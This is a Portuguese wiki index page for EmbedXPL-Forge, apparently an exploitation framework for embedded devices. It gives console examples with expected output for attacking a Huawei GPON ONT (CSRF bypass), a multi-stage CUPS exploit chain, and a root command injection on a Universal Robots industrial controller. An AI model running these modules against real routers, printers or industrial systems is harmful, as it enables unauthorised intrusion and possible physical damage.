# Wiki EmbedXPL-Forge (pt-BR)

**Idioma: Português (pt-BR)**. **English (en-US):** [../en-US/README.md](../en-US/README.md)


Documentação de uso do framework. Leia no GitHub ou copie para o repositório **GitHub Wiki** (clone Git separado).

## Diagramas de arquitetura (classes de dispositivo)

Galeria PNG. Fontes Mermaid: [../../diagrams/architecture/README.md](../../diagrams/architecture/README.md).

| Router SOHO | Switch gerenciado |
|:-----------:|:-----------------:|
| ![SOHO](../../img/architecture/exf_arch_router_soho.png) | ![Switch](../../img/architecture/exf_arch_switch_l2l3.png) |

| CPE ISP / GPON ONT | Edge misto |
|:------------------:|:----------:|
| ![CPE ISP](../../img/architecture/exf_arch_isp_cpe.png) | ![Edge misto](../../img/architecture/exf_arch_edge_mixed.png) |

| Mapa de ataque GPON ONT |
|:-----------------------:|
| ![GPON ONT](../../img/architecture/exf_arch_gpon_ont_attack.png) |

## Índice

| Documento | Conteúdo |
|-----------|----------|
| [01-introducao-e-instalacao.md](01-introducao-e-instalacao.md) | Introdução, escopo, Python, instalação, diagnóstico, logs |
| [02-shell-interativo-comandos.md](02-shell-interativo-comandos.md) | Comandos interativos, discover, sessions |
| [03-busca-e-listagem.md](03-busca-e-listagem.md) | `search`, `show`, listagem de módulos e devices |
| [04-modo-nao-interativo.md](04-modo-nao-interativo.md) | `exf.py -m` / `-s`, automação |
| [05-modulos-creds.md](05-modulos-creds.md) | Módulos de credenciais e opções |
| [06-modulos-exploits.md](06-modulos-exploits.md) | Módulos de exploit, `check`, layout |
| [07-scanners-e-autopwn.md](07-scanners-e-autopwn.md) | Scanners e AutoPwn |
| [08-modulos-generic.md](08-modulos-generic.md) | Módulos genéricos multi-vendor (UPnP IGD, SSDP, SNMP, etc.) |
| [09-payloads-e-encoders.md](09-payloads-e-encoders.md) | Payloads e encoders |
| [10-catalogos-e-ferramentas.md](10-catalogos-e-ferramentas.md) | Catálogos JSON e scripts em `tools/` |
| [11-troubleshooting.md](11-troubleshooting.md) | Falhas comuns e correções |
| [Anexo: índice de módulos](../ANEXO-INDICE-MODULOS.md) | Lista completa de caminhos de módulos |

## Exemplos ponta a ponta (entrada e saida esperada)

### Exploit de roteador (Huawei GPON ONT)

```text
exf > use exploits/routers/huawei/eg8145x6_info_disclosure
exf (EG8145X6 Info Disclosure) > set target 192.168.18.1
exf (EG8145X6 Info Disclosure) > check
exf (EG8145X6 Info Disclosure) > run
```

Saida esperada:

```text
[+] Target is a Huawei GPON ONT - extracting metadata
[+] ProductName: EG8145X6-10
[+] APPVersion: 1.1.1.1
[+] BuildTimestamp: 202410241935450553184798
[*] CSRF token (estatico): 9b41cc4ca5587e32228a6a593a18806d...
[+] getRandString ESTATICO? SIM - CSRF BYPASS POSSIVEL
```

### Exploit de impressora (CUPS Pwn2Own 2026)

```text
exf > use exploits/printers/linux/cups_pwn2own_chain_cve_2026_34480
exf (CUPS Pwn2Own Chain) > set target 192.168.1.10
exf (CUPS Pwn2Own Chain) > set delay 2
exf (CUPS Pwn2Own Chain) > run
```

Saida esperada:

```text
[*] CUPS Pwn2Own 2026 - Chain Completa (CVE-2026-34480)
[+] CUPS IPP acessivel em 192.168.1.10:631
[*] [Stage 1/4] CVE-2026-34477 (cups-browsed UAF)
[+] Stage 1 completo: crash/UAF detectado
[*] [Stage 2/4] CVE-2026-34478 (heap spray)
[+] Stage 2 completo: 32/32 requisicoes aceitas
[*] [Stage 3/4] CVE-2026-34479 (ROP chain LPE)
[+] Stage 3 completo: ROP chain entregue
[+] CUPS nao responde mais - chain executada
```

### Exploit ICS (Universal Robots)

```text
exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
exf (UR PolyScope5) > set target 10.0.1.5
exf (UR PolyScope5) > set cmd "id"
exf (UR PolyScope5) > run
```

Saida esperada:

```text
[*] Conectando ao Dashboard PolyScope em 10.0.1.5:29999
[+] PolyScope Dashboard Server detectado
[*] Tentando command injection (CVE-2026-8153)
[+] Command injection confirmado!
[+] Output: uid=0(root) gid=0(root) groups=0(root)
```

### Modo automacao

```bash
python -m embedxpl -m exploits/routers/huawei/eg8145x6_info_disclosure -s target 192.168.18.1 -s port 80
```

Saida esperada:

```text
[*] Running module: exploits/routers/huawei/eg8145x6_info_disclosure
[+] ProductName: EG8145X6-10
[+] APPVersion: 1.1.1.1
```

## Ver também

- [README.md](../../../README.md)
- [CONTRIBUTING.md](../../../CONTRIBUTING.md)
- [docs/COVERAGE_MATRIX.md](../../COVERAGE_MATRIX.md)
